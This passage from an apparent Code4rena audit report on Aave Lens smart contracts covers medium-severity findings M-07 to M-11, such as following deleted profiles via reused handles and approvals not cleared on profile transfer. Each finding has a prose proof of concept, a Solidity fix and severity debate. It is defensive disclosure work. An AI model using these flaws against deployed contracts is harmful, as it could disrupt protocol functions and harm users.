href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1125575438\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>I still relatively disagree with severity, as with <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26\">M-03 (Issue #26)</a> faulty governance is an acceptable risk parameter. Though we should have been more clear that this is the case! </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1125811742\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I agree with you fully here, but again it comes down to the judging guidelines which might change in the future. The stated attack vector has stated assumptions which leads to a loss of funds.</p>\n<p><code>2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.</code></p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-its-possible-to-follow-deleted-profiles\" style=\"position:relative;\"><a href=\"#m-07-its-possible-to-follow-deleted-profiles\" aria-label=\"m 07 its possible to follow deleted profiles permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/70\">[M-07] It’s possible to follow deleted profiles</a></h2>\n<p><em>Submitted by danb</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/libraries/InteractionLogic.sol#L49\">InteractionLogic.sol#L49</a><br></p>\n<p>When someone tries to follow a profile, it checks if the handle exists, and if it doesn’t, it reverts because the profile is deleted.\nThe problem is that there might be a new profile with the same handle as the deleted one, allowing following deleted profiles.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Alice creates a profile with the handle “alice.” The profile id is 1.<br>\nShe deleted the profile.<br>\nShe opens a new profile with the handle “alice”. The new profile id is 2.<br>\nBob tries to follow the deleted profile (id is 1).<br>\nThe check<br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (_profileIdByHandleHash[keccak256(bytes(handle))] == 0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\trevert Errors.TokenDoesNotExist();</span></span></code></pre>\n<p>doesn’t revert because there exists a profile with the handle “alice”.<br>\nTherefore Bob followed a deleted profile when he meant to follow the new profile.</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (_profileIdByHandleHash[keccak256(bytes(handle))] != profileIds[i])</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\trevert Errors.TokenDoesNotExist();</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/70#issuecomment-1072661676\">Zer0dot (Aave Lens) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Will be changed to use the new <code>exists()</code> terminology. Valid!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/70#issuecomment-1072741927\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>Correction, we won’t be using <code>exists()</code> to prevent extra calls, adding this comment!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/70#issuecomment-1072745226\">Zer0dot (Aave Lens) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Resolved in <a href=\"https://github.com/aave/lens-protocol/pull/69\">aave/lens-protocol#69</a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/70#issuecomment-1117941336\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Nice find!</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-missing-whennotpaused\" style=\"position:relative;\"><a href=\"#m-08-missing-whennotpaused\" aria-label=\"m 08 missing whennotpaused permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/71\">[M-08] Missing whenNotPaused</a></h2>\n<p><em>Submitted by danb</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/LensHub.sol#L929\">LensHub.sol#L929</a><br></p>\n<p>All the external function of LensHub have whenNotPasued modifier.<br>\nHowever, LensHub is erc721 and the transfer function doesn’t have the whenNotPaused modifier.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>In case where the governance wants to stop all activity, they still can’t stop transferring profiles nfts.<br>\nAn example where stopping transferring tokens was actually very helpful:\n<a href=\"https://mobile.twitter.com/flashfish0x/status/1466369783016869892\">https://mobile.twitter.com/flashfish0x/status/1466369783016869892</a>.</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add whenNotPasued to <code>_beforeTokenTransfer</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/71#issuecomment-1075326629\">Zer0dot (Aave Lens) confirmed, resolved, and commented</a>:</strong></p>\n<blockquote>\n<p>Nice! Addressed in <a href=\"https://github.com/aave/lens-protocol/pull/75\">aave/lens-protocol#75</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-collect-modules-can-fail-on-zero-amount-transfers-if-treasury-fee-is-set-to-zero\" style=\"position:relative;\"><a href=\"#m-09-collect-modules-can-fail-on-zero-amount-transfers-if-treasury-fee-is-set-to-zero\" aria-label=\"m 09 collect modules can fail on zero amount transfers if treasury fee is set to zero permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62\">[M-09] Collect modules can fail on zero amount transfers if treasury fee is set to zero</a></h2>\n<p><em>Submitted by hyh</em></p>\n<p>Treasury fee can be zero, while collect modules do attempt to send it in such a case anyway as there is no check in place. Some ERC20 tokens do not allow zero value transfers, reverting such attempts.</p>\n<p>This way, a combination of zero treasury fee and such a token set as a collect fee currency will revert any collect operations, rendering collect functionality unavailable</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Treasury fee can be set to zero:</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/ModuleGlobals.sol#L109\">ModuleGlobals.sol#L109</a><br></p>\n<p>Treasury fee transfer attempts are now done uncoditionally in all the collect modules.</p>\n<p>Namely, FeeCollectModule, LimitedFeeCollectModule, TimedFeeCollectModule and LimitedTimedFeeCollectModule do not check the treasury fee to be send, <code>treasuryAmount</code>, before transferring:</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/FeeCollectModule.sol#L176\">FeeCollectModule.sol#L176</a><br></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedFeeCollectModule.sol#L194\">LimitedFeeCollectModule.sol#L194</a><br></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/TimedFeeCollectModule.sol#L190\">TimedFeeCollectModule.sol#L190</a><br></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedTimedFeeCollectModule.sol#L205\">LimitedTimedFeeCollectModule.sol#L205</a><br></p>\n<p>The same happens in the FeeFollowModule:</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/follow/FeeFollowModule.sol#L90\">FeeFollowModule.sol#L90</a></p>\n<h3 id=\"references\" style=\"position:relative;\"><a href=\"#references\" aria-label=\"references permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>References</h3>\n<p>Some ERC20 tokens revert on zero value transfers:</p>\n<p><a href=\"https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers\">https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers</a></p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider checking the treasury fee amount and do transfer only when it is positive.</p>\n<p>Now:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">IERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);</span></span></code></pre>\n<p>To be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (treasuryAmount &gt; 0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tIERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62#issuecomment-1075347095\">donosonaumczuk (Aave Lens) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This one makes sense to me.\ncc: @Zer0dot </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62#issuecomment-1075414219\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>I think it makes sense, will add!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62#issuecomment-1075438824\">Zer0dot (Aave Lens) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Addressed in <a href=\"https://github.com/aave/lens-protocol/pull/77\">aave/lens-protocol#77</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-zero-collection-module-can-be-whitelisted-and-set-to-a-post-which-will-then-revert-all-collects-and-mirrors-with-publicationdoesnotexist\" style=\"position:relative;\"><a href=\"#m-10-zero-collection-module-can-be-whitelisted-and-set-to-a-post-which-will-then-revert-all-collects-and-mirrors-with-publicationdoesnotexist\" aria-label=\"m 10 zero collection module can be whitelisted and set to a post which will then revert all collects and mirrors with publicationdoesnotexist permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/86\">[M-10] Zero collection module can be whitelisted and set to a post, which will then revert all collects and mirrors with `PublicationDoesNotExist</a></h2>\n<p><em>Submitted by hyh</em></p>\n<p>In case when zero collection module be white listed and then zero collection module set to a post (done by different actors), its functionality will be partially broken: every collecting and mirroring of it will be reverted with Errors.PublicationDoesNotExist, while getPubType will return its type as a Mirror.</p>\n<p>Setting severity to Medium per ‘function of the protocol or its availability could be impacted’, as either the behavior of rejecting collects/mirrors is desired and to be implemented explicitly, or such a scenario shouldn’t exist in a system, i.e. now zero address absence in white list cannot be guaranteed as its setting is manual and possible</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Collect module isn’t checked additionally on init, any white listed address can be set:</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/libraries/PublishingLogic.sol#L308-309\">PublishingLogic.sol#L308-309</a><br></p>\n<p>While zero address also can be white listed:</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/LensHub.sol#L128-135\">LensHub.sol#L128-135</a><br></p>\n<p>If zero address is white listed and then set as collectModule for a post, a getPointedIfMirror helper function called on it will revert with Errors.PublicationDoesNotExist:</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/libraries/Helpers.sol#L47\">Helpers.sol#L47</a><br></p>\n<p>This way all attempts to collect and mirror this post will also revert:</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/libraries/InteractionLogic.sol#L108\">InteractionLogic.sol#L108</a><br></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/libraries/PublishingLogic.sol#L258\">PublishingLogic.sol#L258</a><br></p>\n<p>Also, getContentURI view will fail with the same error:</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/LensHub.sol#L785\">LensHub.sol#L785</a><br></p>\n<p>And getPubType will return Mirror as a publication type:</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/LensHub.sol#L829\">LensHub.sol#L829</a><br></p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider prohibiting zero collection module to be white listed.</p>\n<p>If rejecting collects/mirrors is desired for a special post type, the corresponding error path can be implemented</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/86#issuecomment-1072618239\">Zer0dot (Aave Lens) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>This implies governance is a bad actor, and despite it being a side effect, reverting on a zero collect module is acceptable. IMO this is not relevant, though technically the report is valid, we won’t be changing anything.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/86#issuecomment-1125580607\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>In consistency with some other comments I made, I wonder if marking this as “low” severity makes more sense. Governance being compromised is within acceptable risk parameters.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/86#issuecomment-1126130415\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think this is inline with C4’s guidelines for a <code>medium</code> severity issue. As such, I’d keep this as is.</p>\n<p>This is consistent with other governance related issues.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/86#issuecomment-1126131825\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>Sounds fair!</p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-approvals-not-cleared-when-transferring-profile\" style=\"position:relative;\"><a href=\"#m-11-approvals-not-cleared-when-transferring-profile\" aria-label=\"m 11 approvals not cleared when transferring profile permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22\">[M-11] Approvals not cleared when transferring profile</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/modules/follow/ApprovalFollowModule.sol#L32\">ApprovalFollowModule.sol#L32</a><br></p>\n<p>The <code>ApprovalFollowModule.approve</code> function is indexed by both (<code>owner = IERC721(HUB).ownerOf(profileId)</code>, <code>profileId</code>) in case the profileId NFT is transferred.<br>\nHowever, upon transfer, the old approvals are not cleared.</p>\n<p>This can lead to similar issues as OpenSea not cancelling their sale offers upon NFT transfer.<br>\nWhen the NFT is at some point transferred back to the original owner, all the old approvals are still intact which might not be expected by the owner.</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider resetting all approvals upon transfer.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1039792144\">Zer0dot (Aave Lens) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>This is known and acceptable, users should be able to check their approvals even if they don’t have the profile.</p>\n<p>Paging @oneski if you have any input.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1118551248\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think this issue is entirely valid, it should not be on the users to manage their approvals so much. It would be much safer to wipe approvals on transfers and avoid this issue altogether.</p>\n<p>Keeping this issue open and as is.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1125224994\">donosonaumczuk (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>I would say wiping on transfers is a bit annoying as I could be transferring my profile between two addresses I own. It would be a better alternative to wipe on re-initialization by passing a boolean <code>keepPreviousState</code> flag (or something similar).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1125580300\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>So after some more discussion, I think the points here are valid, but we were aware of this from the beginning. There are pros and cons to maintaining state. This module will not be present at launch and further iteration can modify it. Unfortunately there is no profile NFT transfer hook in follow modules currently. As this is still in my eyes not a direct vulnerability but more a caveat of how this specific system is designed, I would no longer dispute it but I would mark it as a low severity issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1125798004\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>While I agree with you that giving users the ability to save the previous state on transfer makes sense and understand that the necessary changes to do this can be put in place in the future. I think its best I stay consistent with the judging rulebook as per below:<br>\n<code>2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.</code></p>\n<p>I believe the functionality of the protocol is impacted in this scenario so I think its fair to keep this as <code>medium</code> risk.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1126098865\">Zer0dot (Aave Lens) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Sounds fair, acknowledging. This is something we’re going to look 